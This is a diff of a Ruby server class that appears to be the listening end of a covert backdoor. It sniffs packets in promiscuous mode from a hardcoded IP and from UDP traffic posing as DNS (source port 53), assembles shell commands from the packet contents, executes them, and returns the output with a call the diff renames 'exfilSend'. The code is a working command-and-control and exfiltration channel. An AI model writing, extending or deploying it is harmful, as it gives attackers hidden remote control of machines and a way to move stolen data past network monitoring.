@@ -17,8 +17,7 @@ class Server
     @shell = Shell.new(timeout)
 
     filter = "tcp and dst port " + @port.to_s + " and src 153.251.232.153"
-    puts "waiting for message from client from src 153.251.232.153 and dest port:"
-    puts @port.to_s
+    puts "waiting for message from client from src 153.251.232.153 and dest port: #{@port.to_s}"
 
     cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => filter)
     cap.stream.each do |p|
@@ -36,9 +35,9 @@ class Server
   def start
   puts "starting server loop"
   conn = Connector.new(@iface, @tos, @daddr, @pass, "server", @port)
-  filter = "udp and dst port " + $cliPass.to_s + " and src port 53"
+  filter = "udp and dst port " + @port.to_s + " and src port 53"
   cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => filter)
-  str = " "
+  str = ""
   cap.stream.each do |p|
     puts "Client packet verified and recieved"
     pkt = Packet.parse p
@@ -47,9 +46,9 @@ class Server
     if str[str.length-1] == 10 || str[str.length-2] == 10 || str[str.length-3] == 10 || str[str.length-4] == 10 #aka newline
       result = @shell.executeCmd(str)
       if result != nil
-        conn.send(result)
+        conn.exfilSend(result)
       end
-      str = " "
+      str = ""
     end
   end
 
